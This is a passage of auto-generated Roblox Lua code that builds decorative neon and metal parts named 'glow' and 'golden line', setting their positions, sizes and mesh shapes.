glow2.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
glow2.Material = Enum.Material.Neon
glow2.Orientation = Vector3.new(-81.18299865722656, 32.3849983215332, -78.68699645996094)
glow2.RightSurface = Enum.SurfaceType.SmoothNoOutlines
glow2.Rotation = Vector3.new(-82.53700256347656, 4.709000110626221, -46.60900115966797)
glow2.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow2.TopSurface = Enum.SurfaceType.SmoothNoOutlines
glow2.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow2.Name = "glow 2"
glow2.Parent = ycsi

local mesh_14 = Instance.new("SpecialMesh")
mesh_14.MeshType = Enum.MeshType.Sphere
mesh_14.Scale = Vector3.new(0.3499999940395355, 1.100000023841858, 1)
mesh_14.Parent = glow2

local glow2_2 = Instance.new("Part")
glow2_2.BackSurface = Enum.SurfaceType.SmoothNoOutlines
glow2_2.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
glow2_2.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
glow2_2.CFrame = CFrame.fromMatrix(Vector3.new(-2.0577588081359863, 26.744096755981445, 15.518123626708984), Vector3.new(-0.28190308809280396, -0.3218234181404114, 0.9038584232330322), Vector3.new(0.9533233642578125, 0.012272919528186321, 0.30170077085494995), Vector3.new(-0.10818730294704437, 0.9467201232910156, 0.30334219336509705))
glow2_2.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
glow2_2.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
glow2_2.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
glow2_2.Material = Enum.Material.Neon
glow2_2.Orientation = Vector3.new(-71.21299743652344, -19.628999710083008, -87.81600189208984)
glow2_2.RightSurface = Enum.SurfaceType.SmoothNoOutlines
glow2_2.Rotation = Vector3.new(-72.23400115966797, -6.210999965667725, -106.4729995727539)
glow2_2.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow2_2.TopSurface = Enum.SurfaceType.SmoothNoOutlines
glow2_2.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow2_2.Name = "glow 2"
glow2_2.Parent = ycsi

local mesh_15 = Instance.new("SpecialMesh")
mesh_15.MeshType = Enum.MeshType.Sphere
mesh_15.Scale = Vector3.new(0.3499999940395355, 1.100000023841858, 1)
mesh_15.Parent = glow2_2

local glow5 = Instance.new("Part")
glow5.BackSurface = Enum.SurfaceType.SmoothNoOutlines
glow5.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
glow5.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
glow5.CFrame = CFrame.fromMatrix(Vector3.new(-1.862804889678955, 26.358335494995117, 15.755733489990234), Vector3.new(-0.9659256339073181, -0.0000014603135696233949, 0.25881901383399963), Vector3.new(-0.21706563234329224, 0.544633150100708, -0.8100968599319458), Vector3.new(-0.14096026122570038, -0.8386742472648621, -0.5260756015777588))
glow5.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
glow5.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
glow5.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
glow5.Material = Enum.Material.Neon
glow5.Orientation = Vector3.new(57, -165, 0)
glow5.RightSurface = Enum.SurfaceType.SmoothNoOutlines
glow5.Rotation = Vector3.new(122.0989990234375, -8.102999687194824, 167.3350067138672)
glow5.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow5.TopSurface = Enum.SurfaceType.SmoothNoOutlines
glow5.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow5.Name = "glow 5"
glow5.Parent = ycsi

local mesh_16 = Instance.new("BlockMesh")
mesh_16.Scale = Vector3.new(0.6000000238418579, 0.30000001192092896, 0.8999999761581421)
mesh_16.Parent = glow5

local glow5_2 = Instance.new("Part")
glow5_2.BackSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_2.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_2.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
glow5_2.CFrame = CFrame.fromMatrix(Vector3.new(-2.026684284210205, 26.268266677856445, 15.530498504638672), Vector3.new(-0.23632240295410156, 0.15031249821186066, 0.9599778056144714), Vector3.new(-0.9716534614562988, -0.03007526695728302, -0.23448777198791504), Vector3.new(-0.006374754011631012, -0.9881808757781982, 0.15315911173820496))
glow5_2.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
glow5_2.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_2.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_2.Material = Enum.Material.Neon
glow5_2.Orientation = Vector3.new(81.18199920654297, -2.382999897003174, 101.31500244140625)
glow5_2.RightSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_2.Rotation = Vector3.new(81.19000244140625, -0.36500000953674316, 103.66999816894531)
glow5_2.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow5_2.TopSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_2.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow5_2.Name = "glow 5"
glow5_2.Parent = ycsi

local mesh_17 = Instance.new("SpecialMesh")
mesh_17.MeshType = Enum.MeshType.Sphere
mesh_17.Scale = Vector3.new(0.5, 1.2000000476837158, 0.5)
mesh_17.Parent = glow5_2

local glow5_3 = Instance.new("Part")
glow5_3.BackSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_3.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_3.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
glow5_3.CFrame = CFrame.fromMatrix(Vector3.new(-1.8627591133117676, 26.348413467407227, 15.755718231201172), Vector3.new(-0.9659256339073181, -0.0000014603135696233949, 0.25881901383399963), Vector3.new(-0.21706563234329224, 0.544633150100708, -0.8100968599319458), Vector3.new(-0.14096026122570038, -0.8386742472648621, -0.5260756015777588))
glow5_3.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
glow5_3.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_3.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_3.Material = Enum.Material.Neon
glow5_3.Orientation = Vector3.new(57, -165, 0)
glow5_3.RightSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_3.Rotation = Vector3.new(122.0989990234375, -8.102999687194824, 167.3350067138672)
glow5_3.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow5_3.TopSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_3.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow5_3.Name = "glow 5"
glow5_3.Parent = ycsi

local mesh_18 = Instance.new("BlockMesh")
mesh_18.Scale = Vector3.new(0.4000000059604645, 0.30000001192092896, 0.699999988079071)
mesh_18.Parent = glow5_3

local glow5_4 = Instance.new("Part")
glow5_4.BackSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_4.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_4.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
glow5_4.CFrame = CFrame.fromMatrix(Vector3.new(-1.8360333442687988, 26.26833152770996, 15.46908187866211), Vector3.new(0.6960632801055908, 0.3218345642089844, 0.6418085098266602), Vector3.new(-0.674751877784729, -0.012265435419976711, 0.7379423975944519), Vector3.new(0.24536745250225067, -0.9467164278030396, 0.2086210995912552))
glow5_4.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
glow5_4.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_4.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_4.Material = Enum.Material.Neon
glow5_4.Orientation = Vector3.new(71.21199798583984, 49.62799835205078, 92.18299865722656)
glow5_4.RightSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_4.Rotation = Vector3.new(77.572998046875, 14.204000473022461, 44.10900115966797)
glow5_4.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow5_4.TopSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_4.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow5_4.Name = "glow 5"
glow5_4.Parent = ycsi

local mesh_19 = Instance.new("SpecialMesh")
mesh_19.MeshType = Enum.MeshType.Sphere
mesh_19.Scale = Vector3.new(0.5, 1.2000000476837158, 0.5)
mesh_19.Parent = glow5_4

local glow5_5 = Instance.new("Part")
glow5_5.BackSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_5.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_5.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
glow5_5.CFrame = CFrame.fromMatrix(Vector3.new(-1.8601956367492676, 26.37839698791504, 15.765399932861328), Vector3.new(-0.9659256339073181, -0.0000014603135696233949, 0.25881901383399963), Vector3.new(0.14096026122570038, 0.8386742472648621, 0.5260756015777588), Vector3.new(-0.21706563234329224, 0.544633150100708, -0.8100968599319458))
glow5_5.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
glow5_5.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_5.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_5.Material = Enum.Material.Neon
glow5_5.Orientation = Vector3.new(-33, -165, 0)
glow5_5.RightSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_5.Rotation = Vector3.new(-146.08700561523438, -12.536999702453613, -171.69700622558594)
glow5_5.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow5_5.TopSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_5.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow5_5.Name = "glow 5"
glow5_5.Parent = ycsi

local mesh_20 = Instance.new("BlockMesh")
mesh_20.Scale = Vector3.new(0.30000001192092896, 0.30000001192092896, 0.699999988079071)
mesh_20.Parent = glow5_5

local glow5_6 = Instance.new("Part")
glow5_6.BackSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_6.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_6.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
glow5_6.CFrame = CFrame.fromMatrix(Vector3.new(-2.036320209503174, 26.308320999145508, 15.533077239990234), Vector3.new(-0.23632240295410156, 0.15031249821186066, 0.9599778056144714), Vector3.new(-0.9716534614562988, -0.03007526695728302, -0.23448777198791504), Vector3.new(-0.006374754011631012, -0.9881808757781982, 0.15315911173820496))
glow5_6.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
glow5_6.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_6.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_6.Material = Enum.Material.Neon
glow5_6.Orientation = Vector3.new(81.18199920654297, -2.382999897003174, 101.31500244140625)
glow5_6.RightSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_6.Rotation = Vector3.new(81.19000244140625, -0.36500000953674316, 103.66999816894531)
glow5_6.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow5_6.TopSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_6.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow5_6.Name = "glow 5"
glow5_6.Parent = ycsi

local mesh_21 = Instance.new("SpecialMesh")
mesh_21.MeshType = Enum.MeshType.Sphere
mesh_21.Scale = Vector3.new(0.3499999940395355, 1.100000023841858, 1)
mesh_21.Parent = glow5_6

local glow5_7 = Instance.new("Part")
glow5_7.BackSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_7.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_7.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
glow5_7.CFrame = CFrame.fromMatrix(Vector3.new(-1.862804889678955, 26.398340225219727, 15.755733489990234), Vector3.new(-0.9659256339073181, -0.0000014603135696233949, 0.25881901383399963), Vector3.new(0.14096026122570038, 0.8386742472648621, 0.5260756015777588), Vector3.new(-0.21706563234329224, 0.544633150100708, -0.8100968599319458))
glow5_7.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
glow5_7.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_7.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_7.Material = Enum.Material.Neon
glow5_7.Orientation = Vector3.new(-33, -165, 0)
glow5_7.RightSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_7.Rotation = Vector3.new(-146.08700561523438, -12.536999702453613, -171.69700622558594)
glow5_7.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow5_7.TopSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_7.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow5_7.Name = "glow 5"
glow5_7.Parent = ycsi

local mesh_22 = Instance.new("BlockMesh")
mesh_22.Scale = Vector3.new(0.5, 0.30000001192092896, 0.8999999761581421)
mesh_22.Parent = glow5_7

local glow5_8 = Instance.new("Part")
glow5_8.BackSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_8.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_8.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
glow5_8.CFrame = CFrame.fromMatrix(Vector3.new(-1.8290066719055176, 26.308320999145508, 15.456829071044922), Vector3.new(0.6960632801055908, 0.3218345642089844, 0.6418085098266602), Vector3.new(-0.674751877784729, -0.012265435419976711, 0.7379423975944519), Vector3.new(0.24536745250225067, -0.9467164278030396, 0.2086210995912552))
glow5_8.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
glow5_8.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_8.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_8.Material = Enum.Material.Neon
glow5_8.Orientation = Vector3.new(71.21199798583984, 49.62799835205078, 92.18299865722656)
glow5_8.RightSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_8.Rotation = Vector3.new(77.572998046875, 14.204000473022461, 44.10900115966797)
glow5_8.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow5_8.TopSurface = Enum.SurfaceType.SmoothNoOutlines
glow5_8.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow5_8.Name = "glow 5"
glow5_8.Parent = ycsi

local mesh_23 = Instance.new("SpecialMesh")
mesh_23.MeshType = Enum.MeshType.Sphere
mesh_23.Scale = Vector3.new(0.3499999940395355, 1.100000023841858, 1)
mesh_23.Parent = glow5_8

local glow3 = Instance.new("Part")
glow3.BackSurface = Enum.SurfaceType.SmoothNoOutlines
glow3.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
glow3.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
glow3.CFrame = CFrame.fromMatrix(Vector3.new(-1.8790555000305176, 26.694108963012695, 15.760082244873047), Vector3.new(0.9659256339073181, 0.0000014603135696233949, -0.25881901383399963), Vector3.new(-0.2170621156692505, -0.544644832611084, -0.8100899457931519), Vector3.new(-0.14096565544605255, 0.8386666178703308, -0.5260862112045288))
glow3.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
glow3.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
glow3.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
glow3.Material = Enum.Material.Neon
glow3.Orientation = Vector3.new(-57, -165, 180)
glow3.RightSurface = Enum.SurfaceType.SmoothNoOutlines
glow3.Rotation = Vector3.new(-122.0999984741211, -8.104000091552734, 12.664999961853027)
glow3.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow3.TopSurface = Enum.SurfaceType.SmoothNoOutlines
glow3.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow3.Name = "glow3"
glow3.Parent = ycsi

local mesh_24 = Instance.new("BlockMesh")
mesh_24.Scale = Vector3.new(0.6000000238418579, 0.30000001192092896, 0.8999999761581421)
mesh_24.Parent = glow3

local glow3_2 = Instance.new("Part")
glow3_2.BackSurface = Enum.SurfaceType.SmoothNoOutlines
glow3_2.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
glow3_2.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
glow3_2.CFrame = CFrame.fromMatrix(Vector3.new(-1.8790555000305176, 26.654088973999023, 15.760082244873047), Vector3.new(0.9659256339073181, 0.0000014603135696233949, -0.25881901383399963), Vector3.new(0.14096565544605255, -0.8386666178703308, 0.5260862112045288), Vector3.new(-0.2170621156692505, -0.544644832611084, -0.8100899457931519))
glow3_2.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
glow3_2.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
glow3_2.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
glow3_2.Material = Enum.Material.Neon
glow3_2.Orientation = Vector3.new(33, -165, 180)
glow3_2.RightSurface = Enum.SurfaceType.SmoothNoOutlines
glow3_2.Rotation = Vector3.new(146.08599853515625, -12.536999702453613, -8.303000450134277)
glow3_2.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow3_2.TopSurface = Enum.SurfaceType.SmoothNoOutlines
glow3_2.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow3_2.Name = "glow3"
glow3_2.Parent = ycsi

local mesh_25 = Instance.new("BlockMesh")
mesh_25.Scale = Vector3.new(0.5, 0.30000001192092896, 0.8999999761581421)
mesh_25.Parent = glow3_2

local glow4 = Instance.new("Part")
glow4.BackSurface = Enum.SurfaceType.SmoothNoOutlines
glow4.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
glow4.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
glow4.CFrame = CFrame.fromMatrix(Vector3.new(-1.8790555000305176, 26.704072952270508, 15.760082244873047), Vector3.new(0.9659256339073181, 0.0000014603135696233949, -0.25881901383399963), Vector3.new(-0.2170621156692505, -0.544644832611084, -0.8100899457931519), Vector3.new(-0.14096565544605255, 0.8386666178703308, -0.5260862112045288))
glow4.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
glow4.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
glow4.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
glow4.Material = Enum.Material.Neon
glow4.Orientation = Vector3.new(-57, -165, 180)
glow4.RightSurface = Enum.SurfaceType.SmoothNoOutlines
glow4.Rotation = Vector3.new(-122.0999984741211, -8.104000091552734, 12.664999961853027)
glow4.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow4.TopSurface = Enum.SurfaceType.SmoothNoOutlines
glow4.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow4.Name = "glow4"
glow4.Parent = ycsi

local mesh_26 = Instance.new("BlockMesh")
mesh_26.Scale = Vector3.new(0.4000000059604645, 0.30000001192092896, 0.699999988079071)
mesh_26.Parent = glow4

local glow4_2 = Instance.new("Part")
glow4_2.BackSurface = Enum.SurfaceType.SmoothNoOutlines
glow4_2.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
glow4_2.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
glow4_2.CFrame = CFrame.fromMatrix(Vector3.new(-1.8764615058898926, 26.67403221130371, 15.769756317138672), Vector3.new(0.9659256339073181, 0.0000014603135696233949, -0.25881901383399963), Vector3.new(0.14096565544605255, -0.8386666178703308, 0.5260862112045288), Vector3.new(-0.2170621156692505, -0.544644832611084, -0.8100899457931519))
glow4_2.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
glow4_2.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
glow4_2.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
glow4_2.Material = Enum.Material.Neon
glow4_2.Orientation = Vector3.new(33, -165, 180)
glow4_2.RightSurface = Enum.SurfaceType.SmoothNoOutlines
glow4_2.Rotation = Vector3.new(146.08599853515625, -12.536999702453613, -8.303000450134277)
glow4_2.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow4_2.TopSurface = Enum.SurfaceType.SmoothNoOutlines
glow4_2.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
glow4_2.Name = "glow4"
glow4_2.Parent = ycsi

local mesh_27 = Instance.new("BlockMesh")
mesh_27.Scale = Vector3.new(0.30000001192092896, 0.30000001192092896, 0.699999988079071)
mesh_27.Parent = glow4_2

local goldenline = Instance.new("Part")
goldenline.BackSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
goldenline.CFrame = CFrame.fromMatrix(Vector3.new(-1.9378705024719238, 26.52927589416504, 15.965618133544922), Vector3.new(-0.82947838306427, 8.772715318627888e-07, 0.5585386157035828), Vector3.new(0.5585386157035828, 0.000014649654985987581, 0.8294786810874939), Vector3.new(-0.000007470604941772763, 0.9999998807907104, -0.000012644275557249784))
goldenline.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
goldenline.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline.Material = Enum.Material.Metal
goldenline.Orientation = Vector3.new(-90, -146.0449981689453, 0)
goldenline.RightSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline.Rotation = Vector3.new(-90.0009994506836, 0, -146.0449981689453)
goldenline.Size = Vector3.new(0.20000000298023224, 0.6699999570846558, 0.3499999940395355)
goldenline.TopSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline.size = Vector3.new(0.20000000298023224, 0.6699999570846558, 0.3499999940395355)
goldenline.Name = "golden line"
goldenline.Parent = ycsi

local mesh_28 = Instance.new("BlockMesh")
mesh_28.Scale = Vector3.new(0.07000000029802322, 1, 0.7099999785423279)
mesh_28.Parent = goldenline

local goldenline_2 = Instance.new("Part")
goldenline_2.BackSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_2.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_2.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
goldenline_2.CFrame = CFrame.fromMatrix(Vector3.new(-2.1921277046203613, 26.5291805267334, 15.451229095458984), Vector3.new(-0.7501952648162842, -0.00002257291089335922, -0.6612162590026855), Vector3.new(0.661216139793396, 0.000008573577360948548, -0.7501952648162842), Vector3.new(0.000022644117052550428, -0.9999998807907104, 0.000008474798960378394))
goldenline_2.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
goldenline_2.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_2.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_2.Material = Enum.Material.Metal
goldenline_2.Orientation = Vector3.new(90, 138.60699462890625, 0)
goldenline_2.RightSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_2.Rotation = Vector3.new(90, 0.0010000000474974513, -138.60699462890625)
goldenline_2.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.3499999940395355)
goldenline_2.TopSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_2.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.3499999940395355)
goldenline_2.Name = "golden line"
goldenline_2.Parent = ycsi

local mesh_29 = Instance.new("BlockMesh")
mesh_29.Scale = Vector3.new(0.07000000029802322, 1, 0.7099999785423279)
mesh_29.Parent = goldenline_2

local goldenline_3 = Instance.new("Part")
goldenline_3.BackSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_3.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_3.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
goldenline_3.CFrame = CFrame.fromMatrix(Vector3.new(-2.2357373237609863, 26.5291805267334, 15.597492218017578), Vector3.new(-0.9438031911849976, -0.000020425670300028287, 0.3305068016052246), Vector3.new(-0.3305067718029022, -0.000005850548859598348, -0.9438033103942871), Vector3.new(0.00002127496372850146, -0.9999998807907104, -0.0000012408422662701923))
goldenline_3.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
goldenline_3.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_3.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_3.Material = Enum.Material.Metal
goldenline_3.Orientation = Vector3.new(90, -160.6999969482422, 0)
goldenline_3.RightSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_3.Rotation = Vector3.new(90, 0.0010000000474974513, 160.6999969482422)
goldenline_3.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.3499999940395355)
goldenline_3.TopSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_3.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.3499999940395355)
goldenline_3.Name = "golden line"
goldenline_3.Parent = ycsi

local mesh_30 = Instance.new("BlockMesh")
mesh_30.Scale = Vector3.new(0.07000000029802322, 0.800000011920929, 0.7099999785423279)
mesh_30.Parent = goldenline_3

local goldenline_4 = Instance.new("Part")
goldenline_4.BackSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_4.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_4.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
goldenline_4.CFrame = CFrame.fromMatrix(Vector3.new(-1.7284893989562988, 26.529253005981445, 15.904613494873047), Vector3.new(-0.9980186820030212, -0.000012960386811755598, -0.06291761994361877), Vector3.new(-0.06291759014129639, -0.000003323997589177452, 0.998018741607666), Vector3.new(-0.000013162638424546458, 0.9999998807907104, 0.0000024993196348077618))
goldenline_4.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
goldenline_4.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_4.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_4.Material = Enum.Material.Metal
goldenline_4.Orientation = Vector3.new(-90, 176.39300537109375, 0)
goldenline_4.RightSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_4.Rotation = Vector3.new(-90, -0.0010000000474974513, 176.39300537109375)
goldenline_4.Size = Vector3.new(0.20000000298023224, 0.6599999666213989, 0.3499999940395355)
goldenline_4.TopSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_4.size = Vector3.new(0.20000000298023224, 0.6599999666213989, 0.3499999940395355)
goldenline_4.Name = "golden line"
goldenline_4.Parent = ycsi

local mesh_31 = Instance.new("BlockMesh")
mesh_31.Scale = Vector3.new(0.07000000029802322, 1, 0.7099999785423279)
mesh_31.Parent = goldenline_4

local goldenline_5 = Instance.new("Part")
goldenline_5.BackSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_5.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_5.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
goldenline_5.CFrame = CFrame.fromMatrix(Vector3.new(-1.6524243354797363, 26.529199600219727, 15.44118881225586), Vector3.new(0.9826109409332275, 0.000021468173144967295, -0.18567436933517456), Vector3.new(-0.18567439913749695, -0.00000801577334641479, -0.9826110601425171), Vector3.new(-0.000022642792828264646, 0.9999998807907104, -0.000003863969595840899))
goldenline_5.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
goldenline_5.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_5.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_5.Material = Enum.Material.Metal
goldenline_5.Orientation = Vector3.new(-90, 10.699999809265137, 0)
goldenline_5.RightSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_5.Rotation = Vector3.new(-90, -0.0010000000474974513, 10.699999809265137)
goldenline_5.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.3499999940395355)
goldenline_5.TopSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_5.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.3499999940395355)
goldenline_5.Name = "golden line"
goldenline_5.Parent = ycsi

local mesh_32 = Instance.new("BlockMesh")
mesh_32.Scale = Vector3.new(0.07000000029802322, 0.800000011920929, 0.7099999785423279)
mesh_32.Parent = goldenline_5

local goldenline_6 = Instance.new("Part")
goldenline_6.BackSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_6.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_6.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
goldenline_6.CFrame = CFrame.fromMatrix(Vector3.new(-1.7633709907531738, 26.529218673706055, 15.336345672607422), Vector3.new(0.3190799951553345, 0.000010991740055033006, -0.9477276802062988), Vector3.new(-0.9477275609970093, -0.00001627021629246883, -0.31908008456230164), Vector3.new(-0.00001897069341794122, 0.9999998807907104, 0.000005234599939285545))
goldenline_6.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
goldenline_6.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
goldenline_6.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
